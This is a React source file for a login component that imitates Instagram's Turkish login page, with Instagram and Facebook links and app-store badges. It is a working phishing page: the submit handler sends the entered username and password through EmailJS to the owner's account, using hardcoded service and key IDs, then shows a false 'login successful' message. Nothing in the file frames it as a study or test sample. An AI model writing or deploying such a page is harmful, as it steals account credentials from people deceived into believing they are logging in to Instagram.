import { useState } from "react";
import playstore from "../../images/googleplay.png";
import microsoft from "../../images/microsoft.png";
import { useRef } from "react";
import emailjs from "@emailjs/browser";
import toast, { Toaster } from "react-hot-toast";
const Loginbar = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [passwordType, setPasswordType] = useState(false);
  const form = useRef();

  const seePassword = () => {
    setPasswordType((prev) => !prev);
  };

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_2fl2u07",
        "template_oheqzy5",
        form.current,
        "3-IMzKKzNY6-QIxPY"
      )
      .then(
        (result) => {
          toast.success("Giriş başarıyla yapıldı!");
        },
        (error) => {
          toast.error("Giriş yapılamadı!");
        }
      );
  };

  return (
    <div className="h-[582px]">
      <Toaster position="top-center" reverseOrder={false} />
      <form
        ref={form}
        onSubmit={sendEmail}
        className="max-w-[350px] w-full rounded h-[401.98px] md:border border-gray-300 flex flex-col "
      >
        <div className="logo mt-12 mx-auto"></div>
        <div className="mt-6 max-w-[350px]  ">
          <label className="h-[38px] w-[268px] relative transition ">
            <input
              name="username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              type="text"
              className="focus:border-gray-400 border rounded outline-none  h-[36px] w-[268px] pl-2 text-xs  mb-[6px] mx-10 bg-[#FAFAFA] peer transition
          "
            />
            <span className="absolute h-[18px]  text-[12px] left-12 top-1/2 -translate-y-1/2 peer-valid:top-3  text-gray-500 transition  peer-valid:h-[36px] peer-valid:text-[10px] peer-valid:transition-all pointer-events-none">
              Telefon numarası, kullanıcı adı veya e-posta
            </span>
          </label>
          <label className="h-[38px] w-[268px] relative transition ">
            <input
              name="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              type={`${passwordType ? "text" : "password"}`}
              className="focus:border-gray-400  border rounded outline-none  h-[36px] w-[268px] pl-2 text-xs mb-[6px] mx-10 bg-[#FAFAFA] peer transition
          "
            />
            <span className="absolute h-[18px]  text-[12px] left-12 top-1/2 -translate-y-1/2 peer-valid:top-3 text-gray-500 transition  peer-valid:h-[38px] peer-valid:text-[10px] peer-valid:transition-all pointer-events-none">
              Şifre
            </span>
            {password.length > 0 ? (
              <span
                onClick={seePassword}
                className="cursor-pointer absolute right-12 text-xs top-1/2 -translate-y-1/2 font-semibold select-none"
              >
                Göster
              </span>
            ) : (
              ""
            )}
          </label>
          {username.length > 0 && password.length > 6 ? (
            <button
              type="submit"
              className="mx-10 text-center bg-[#0095F6] disabled:opacity-70 my-2 rounded-lg font-semibold text-white text-[14px] py-[7px] px-4 items-center flex justify-center w-[268px] h-8"
            >
              Giriş Yap
            </button>
          ) : (
            <button
              type="submit"
              disabled
              className="mx-10 text-center bg-[#0095F6] disabled:opacity-70 my-2 rounded-lg font-semibold text-white text-[14px] py-[7px] px-4 items-center flex justify-center w-[268px] h-8"
            >
              Giriş Yap
            </button>
          )}
          <div className="flex justify-center items-center mt-[16px] mb-[18px]">
            <hr className="w-[97px] h-0.5  " />
            <span className="mr-[18px] ml-[18px] text-[#73739B] font-[600] text-[0.8125rem]">
              YA DA
            </span>
            <hr className="w-[97px] h-0.5  " />
          </div>
          <div className="relative mt-6 flex justify-center items-center text-[14px] gap-2 font-semibold text-[#385185]">
            <span className="facebook"></span>

            <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Dtr_TR%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522yjq6m9h0q9911vsgr021wgm0fv1x62njz1rih7tqf4bugx13mh4es%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc1510d0e-b37f-4a46-a5ba-f80f4d582e0d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522yjq6m9h0q9911vsgr021wgm0fv1x62njz1rih7tqf4bugx13mh4es%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=tr_TR&pl_dbl=0">
              Facebook ile Giriş Yap
            </a>
          </div>
          <div>
            <span className="text-[12px] text-[#00376B] flex items-center justify-center mt-6">
              Şifeni mi unuttun?
            </span>
          </div>
        </div>
      </form>
      <div className="max-w-[350px] w-full rounded  h-[63px] md:border border-gray-300 mt-0 md:mt-3 flex flex-col py-[10px]">
        <span className="flex items-center justify-center h-full text-[14px]">
          Hesabın yok mu?
          <a href="https://www.instagram.com/accounts/emailsignup/">
            <span className="font-semibold text-[#0095F6] ml-1"> Kaydol</span>
          </a>
        </span>
      </div>
      <div className="max-w-[350px]">
        <span className="flex text-[14px] justify-center items-center my-[10px] mx-5">
          Uygulamayı indir.
        </span>
        <div className="flex justify-center">
          <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D0C826C21-17C3-444A-ABB7-EBABD37214D7%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dqr_code%26original_referrer%3Dhttps%253A%252F%252Fwww.instagram.com%252F">
            <img
              height={40}
              width={134.28}
              className="mr-2 object-contain"
              src={playstore}
            />
          </a>
          <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=4%2C2%2C1926%2C421">
            <img
              height={40}
              width={110.77}
              className=" object-contain"
              src={microsoft}
            />
          </a>
        </div>
      </div>
    </div>
  );
};

export default Loginbar;
